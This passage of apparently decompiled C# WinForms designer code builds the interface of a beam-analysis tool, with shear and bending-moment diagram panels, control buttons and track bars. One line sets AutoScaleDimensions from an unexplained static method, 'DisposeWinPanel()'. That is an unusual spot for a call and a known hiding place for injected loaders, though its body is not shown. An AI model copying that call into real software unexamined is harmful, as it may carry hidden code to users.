      this.tableLayoutPanel1.Size = new Size(67, 518);
      this.tableLayoutPanel1.TabIndex = 1;
      this.button1.BackColor = Color.Gray;
      this.button1.Dock = DockStyle.Fill;
      this.button1.ForeColor = SystemColors.ButtonHighlight;
      this.button1.Location = new Point(3, 3);
      this.button1.Name = "button1";
      this.button1.Size = new Size(61, 48);
      this.button1.TabIndex = 0;
      this.button1.Text = "start";
      this.button1.UseVisualStyleBackColor = false;
      this.button1.Click += new EventHandler(this.button1_Click);
      this.button2.BackColor = Color.Gray;
      this.button2.Dock = DockStyle.Fill;
      this.button2.ForeColor = SystemColors.ButtonHighlight;
      this.button2.Location = new Point(3, 57);
      this.button2.Name = "button2";
      this.button2.Size = new Size(61, 48);
      this.button2.TabIndex = 1;
      this.button2.Text = "pause";
      this.button2.UseVisualStyleBackColor = false;
      this.button2.Click += new EventHandler(this.button2_Click);
      this.button3.BackColor = Color.Gray;
      this.button3.Dock = DockStyle.Fill;
      this.button3.ForeColor = SystemColors.ButtonHighlight;
      this.button3.Location = new Point(3, 111);
      this.button3.Name = "button3";
      this.button3.Size = new Size(61, 48);
      this.button3.TabIndex = 2;
      this.button3.Text = "new test";
      this.button3.UseVisualStyleBackColor = false;
      this.button3.Click += new EventHandler(this.button3_Click);
      this.button4.BackColor = Color.Gray;
      this.button4.Dock = DockStyle.Fill;
      this.button4.ForeColor = SystemColors.ButtonHighlight;
      this.button4.Location = new Point(3, 165);
      this.button4.Name = "button4";
      this.button4.Size = new Size(61, 48);
      this.button4.TabIndex = 3;
      this.button4.Text = "clear";
      this.button4.UseVisualStyleBackColor = false;
      this.button4.Click += new EventHandler(this.button4_Click);
      this.button5.BackColor = Color.Gray;
      this.button5.Dock = DockStyle.Fill;
      this.button5.ForeColor = SystemColors.ButtonHighlight;
      this.button5.Location = new Point(3, 219);
      this.button5.Name = "button5";
      this.button5.Size = new Size(61, 48);
      this.button5.TabIndex = 4;
      this.button5.Text = "stop";
      this.button5.UseVisualStyleBackColor = false;
      this.button5.Click += new EventHandler(this.button5_Click);
      this.label3.AutoSize = true;
      this.label3.BackColor = Color.DimGray;
      this.label3.Dock = DockStyle.Fill;
      this.label3.ForeColor = SystemColors.ButtonHighlight;
      this.label3.Location = new Point(3, 270);
      this.label3.Name = "label3";
      this.label3.Size = new Size(61, 41);
      this.label3.TabIndex = 6;
      this.label3.Text = "update speed per second";
      this.trackBar2.BackColor = SystemColors.ControlDark;
      this.trackBar2.Dock = DockStyle.Fill;
      this.trackBar2.Location = new Point(3, 331);
      this.trackBar2.Maximum = 20;
      this.trackBar2.Minimum = 1;
      this.trackBar2.Name = "trackBar2";
      this.trackBar2.Orientation = Orientation.Vertical;
      this.trackBar2.Size = new Size(61, 184);
      this.trackBar2.TabIndex = 5;
      this.trackBar2.TickStyle = TickStyle.Both;
      this.trackBar2.Value = 1;
      this.trackBar2.ValueChanged += new EventHandler(this.trackBar2_ValueChanged);
      this.label4.AutoSize = true;
      this.label4.BackColor = Color.DimGray;
      this.label4.Dock = DockStyle.Fill;
      this.label4.ForeColor = SystemColors.ButtonHighlight;
      this.label4.Location = new Point(3, 311);
      this.label4.Name = "label4";
      this.label4.Size = new Size(61, 17);
      this.label4.TabIndex = 7;
      this.label4.Text = "label4";
      this.splitContainerMainLeftRight.Dock = DockStyle.Fill;
      this.splitContainerMainLeftRight.Location = new Point(0, 0);
      this.splitContainerMainLeftRight.Name = "splitContainerMainLeftRight";
      this.splitContainerMainLeftRight.Orientation = Orientation.Horizontal;
      this.splitContainerMainLeftRight.Panel1.BackColor = Color.Black;
      this.splitContainerMainLeftRight.Panel2.BackColor = Color.Transparent;
      this.splitContainerMainLeftRight.Panel2.Controls.Add((Control) this.panel3);
      this.splitContainerMainLeftRight.Panel2.Controls.Add((Control) this.panel2);
      this.splitContainerMainLeftRight.Panel2.Controls.Add((Control) this.labelPos);
      this.splitContainerMainLeftRight.Panel2.Controls.Add((Control) this.trackBar1);
      this.splitContainerMainLeftRight.Panel2.Paint += new PaintEventHandler(this.splitContainerMainLeftRight_Panel2_Paint);
      this.splitContainerMainLeftRight.Size = new Size(417, 518);
      this.splitContainerMainLeftRight.SplitterDistance = 256;
      this.splitContainerMainLeftRight.TabIndex = 0;
      this.panel3.BackColor = Color.DimGray;
      this.panel3.Controls.Add((Control) this.labelMoment);
      this.panel3.Controls.Add((Control) this.labelDef);
      this.panel3.Controls.Add((Control) this.labelShare);
      this.panel3.Location = new Point(6, 78);
      this.panel3.Name = "panel3";
      this.panel3.Size = new Size(208, 91);
      this.panel3.TabIndex = 10;
      this.labelMoment.AutoSize = true;
      this.labelMoment.BackColor = Color.DimGray;
      this.labelMoment.ForeColor = SystemColors.ButtonHighlight;
      this.labelMoment.Location = new Point(31, 14);
      this.labelMoment.Name = "labelMoment";
      this.labelMoment.Size = new Size(35, 13);
      this.labelMoment.TabIndex = 5;
      this.labelMoment.Text = "label1";
      this.labelDef.AutoSize = true;
      this.labelDef.BackColor = Color.DimGray;
      this.labelDef.ForeColor = SystemColors.ButtonHighlight;
      this.labelDef.Location = new Point(31, 56);
      this.labelDef.Name = "labelDef";
      this.labelDef.Size = new Size(35, 13);
      this.labelDef.TabIndex = 6;
      this.labelDef.Text = "label1";
      this.labelShare.AutoSize = true;
      this.labelShare.BackColor = Color.DimGray;
      this.labelShare.ForeColor = SystemColors.ButtonHighlight;
      this.labelShare.Location = new Point(31, 35);
      this.labelShare.Name = "labelShare";
      this.labelShare.Size = new Size(35, 13);
      this.labelShare.TabIndex = 3;
      this.labelShare.Text = "label1";
      this.panel2.BackColor = Color.DimGray;
      this.panel2.Controls.Add((Control) this.label7);
      this.panel2.Controls.Add((Control) this.label8);
      this.panel2.Location = new Point(6, 3);
      this.panel2.Name = "panel2";
      this.panel2.Size = new Size(188, 65);
      this.panel2.TabIndex = 9;
      this.label7.AutoSize = true;
      this.label7.BackColor = Color.DimGray;
      this.label7.ForeColor = SystemColors.ButtonHighlight;
      this.label7.Location = new Point(24, 11);
      this.label7.Name = "label7";
      this.label7.Size = new Size(35, 13);
      this.label7.TabIndex = 7;
      this.label7.Text = "label7";
      this.label8.AutoSize = true;
      this.label8.BackColor = Color.DimGray;
      this.label8.ForeColor = SystemColors.ButtonHighlight;
      this.label8.Location = new Point(24, 38);
      this.label8.Name = "label8";
      this.label8.Size = new Size(35, 13);
      this.label8.TabIndex = 8;
      this.label8.Text = "label8";
      this.labelPos.AutoSize = true;
      this.labelPos.BackColor = SystemColors.ControlDark;
      this.labelPos.ForeColor = Color.White;
      this.labelPos.Location = new Point(3, 230);
      this.labelPos.Name = "labelPos";
      this.labelPos.Size = new Size(35, 13);
      this.labelPos.TabIndex = 4;
      this.labelPos.Text = "label1";
      this.trackBar1.BackColor = SystemColors.ControlDark;
      this.trackBar1.Dock = DockStyle.Bottom;
      this.trackBar1.Location = new Point(0, 213);
      this.trackBar1.Name = "trackBar1";
      this.trackBar1.Size = new Size(417, 45);
      this.trackBar1.TabIndex = 2;
      this.trackBar1.TickStyle = TickStyle.None;
      this.trackBar1.Scroll += new EventHandler(this.trackBar1_Scroll);
      this.trackBar1.ValueChanged += new EventHandler(this.trackBar1_ValueChanged);
      this.panel1.BackColor = Color.DimGray;
      this.panel1.Controls.Add((Control) this.label6);
      this.panel1.Controls.Add((Control) this.label5);
      this.panel1.Controls.Add((Control) this.labelSCM);
      this.panel1.Controls.Add((Control) this.labelSRM);
      this.panel1.Location = new Point(7, 7);
      this.panel1.Name = "panel1";
      this.panel1.Size = new Size(276, 143);
      this.panel1.TabIndex = 2;
      this.label6.AutoSize = true;
      this.label6.BackColor = Color.DimGray;
      this.label6.Font = new Font("Tahoma", 9f);
      this.label6.ForeColor = SystemColors.ButtonHighlight;
      this.label6.Location = new Point(3, 93);
      this.label6.Name = "label6";
      this.label6.Size = new Size(146, 14);
      this.label6.TabIndex = 2;
      this.label6.Text = "Maximum reinforcement :";
      this.label5.AutoSize = true;
      this.label5.BackColor = Color.DimGray;
      this.label5.Font = new Font("Tahoma", 9f);
      this.label5.ForeColor = SystemColors.ButtonHighlight;
      this.label5.Location = new Point(3, 68);
      this.label5.Name = "label5";
      this.label5.Size = new Size(169, 14);
      this.label5.TabIndex = 1;
      this.label5.Text = "Strength  Reduction Factor : ";
      this.labelSCM.AutoSize = true;
      this.labelSCM.BackColor = Color.DimGray;
      this.labelSCM.Font = new Font("Tahoma", 9f);
      this.labelSCM.ForeColor = SystemColors.ButtonHighlight;
      this.labelSCM.Location = new Point(3, 41);
      this.labelSCM.Name = "labelSCM";
      this.labelSCM.Size = new Size(142, 14);
      this.labelSCM.TabIndex = 0;
      this.labelSCM.Text = "Section crack moment : ";
      this.labelSRM.AutoSize = true;
      this.labelSRM.BackColor = Color.DimGray;
      this.labelSRM.Font = new Font("Tahoma", 9f);
      this.labelSRM.ForeColor = SystemColors.ButtonHighlight;
      this.labelSRM.Location = new Point(3, 14);
      this.labelSRM.Name = "labelSRM";
      this.labelSRM.Size = new Size(168, 14);
      this.labelSRM.TabIndex = 0;
      this.labelSRM.Text = "Section resistance moment : ";
      this.panelShaer.BackColor = Color.DimGray;
      this.panelShaer.Controls.Add((Control) this.labelMinShaer);
      this.panelShaer.Controls.Add((Control) this.labelMaxShaer);
      this.panelShaer.Controls.Add((Control) this.label2);
      this.panelShaer.ForeColor = SystemColors.ButtonHighlight;
      this.panelShaer.Location = new Point(6, 156);
      this.panelShaer.Name = "panelShaer";
      this.panelShaer.Size = new Size(276, 180);
      this.panelShaer.TabIndex = 1;
      this.labelMinShaer.AutoSize = true;
      this.labelMinShaer.BackColor = Color.DimGray;
      this.labelMinShaer.ForeColor = SystemColors.ButtonHighlight;
      this.labelMinShaer.Location = new Point(126, 15);
      this.labelMinShaer.Name = "labelMinShaer";
      this.labelMinShaer.Size = new Size(0, 13);
      this.labelMinShaer.TabIndex = 3;
      this.labelMaxShaer.AutoSize = true;
      this.labelMaxShaer.BackColor = Color.DimGray;
      this.labelMaxShaer.ForeColor = SystemColors.ButtonHighlight;
      this.labelMaxShaer.Location = new Point(110, 15);
      this.labelMaxShaer.Name = "labelMaxShaer";
      this.labelMaxShaer.Size = new Size(0, 13);
      this.labelMaxShaer.TabIndex = 2;
      this.label2.AutoSize = true;
      this.label2.BackColor = Color.DimGray;
      this.label2.ForeColor = SystemColors.ButtonHighlight;
      this.label2.Location = new Point(12, 15);
      this.label2.Name = "label2";
      this.label2.Size = new Size(93, 13);
      this.label2.TabIndex = 1;
      this.label2.Text = "shaer diagram (N)";
      this.panelMomentom.BackColor = Color.DimGray;
      this.panelMomentom.Controls.Add((Control) this.labelMaxMomentom);
      this.panelMomentom.Controls.Add((Control) this.label1);
      this.panelMomentom.ForeColor = SystemColors.ButtonHighlight;
      this.panelMomentom.Location = new Point(6, 342);
      this.panelMomentom.Name = "panelMomentom";
      this.panelMomentom.Size = new Size(276, 165);
      this.panelMomentom.TabIndex = 0;
      this.labelMaxMomentom.AutoSize = true;
      this.labelMaxMomentom.BackColor = Color.DimGray;
      this.labelMaxMomentom.ForeColor = SystemColors.ButtonHighlight;
      this.labelMaxMomentom.Location = new Point(169, 13);
      this.labelMaxMomentom.Name = "labelMaxMomentom";
      this.labelMaxMomentom.Size = new Size(0, 13);
      this.labelMaxMomentom.TabIndex = 1;
      this.label1.AutoSize = true;
      this.label1.BackColor = Color.DimGray;
      this.label1.ForeColor = SystemColors.ButtonHighlight;
      this.label1.Location = new Point(14, 13);
      this.label1.Name = "label1";
      this.label1.Size = new Size(171, 13);
      this.label1.TabIndex = 0;
      this.label1.Text = "bending momentom diagram (N.m)";
      this.timer1.Tick += new EventHandler(this.timer1_Tick);
      this.AutoScaleDimensions = mainWorkForm.DisposeWinPanel();
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackgroundImage = (Image) mainPorject.Properties.Resources._1600x900;
      this.BackgroundImageLayout = ImageLayout.Stretch;
      this.ClientSize = new Size(784, 542);
      this.Controls.Add((Control) this.MainSplitContainer);
      this.Controls.Add((Control) this.menuStrip1);
      this.FormBorderStyle = FormBorderStyle.Fixed3D;
      this.MainMenuStrip = this.menuStrip1;
      this.Name = nameof (mainWorkForm);
      this.Text = nameof (mainWorkForm);
      this.Load += new EventHandler(this.mainWorkForm_Load);
      this.menuStrip1.ResumeLayout(false);
      this.menuStrip1.PerformLayout();
      this.MainSplitContainer.Panel1.ResumeLayout(false);
      this.MainSplitContainer.Panel2.ResumeLayout(false);
      this.MainSplitContainer.EndInit();
      this.MainSplitContainer.ResumeLayout(false);
      this.splitContainerMainLeft.Panel1.ResumeLayout(false);
      this.splitContainerMainLeft.Panel2.ResumeLayout(false);
      this.splitContainerMainLeft.EndInit();
      this.splitContainerMainLeft.ResumeLayout(false);
      this.tableLayoutPanel1.ResumeLayout(false);
      this.tableLayoutPanel1.PerformLayout();
      this.trackBar2.EndInit();
      this.splitContainerMainLeftRight.Panel2.ResumeLayout(false);
      this.splitContainerMainLeftRight.Panel2.PerformLayout();
      this.splitContainerMainLeftRight.EndInit();
      this.splitContainerMainLeftRight.ResumeLayout(false);
      this.panel3.ResumeLayout(false);
      this.panel3.PerformLayout();
      this.panel2.ResumeLayout(false);
      this.panel2.PerformLayout();
      this.trackBar1.EndInit();
      this.panel1.ResumeLayout(false);
      this.panel1.PerformLayout();
      this.panelShaer.ResumeLayout(false);
      this.panelShaer.PerformLayout();
      this.panelMomentom.ResumeLayout(false);
      this.panelMomentom.PerformLayout();
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
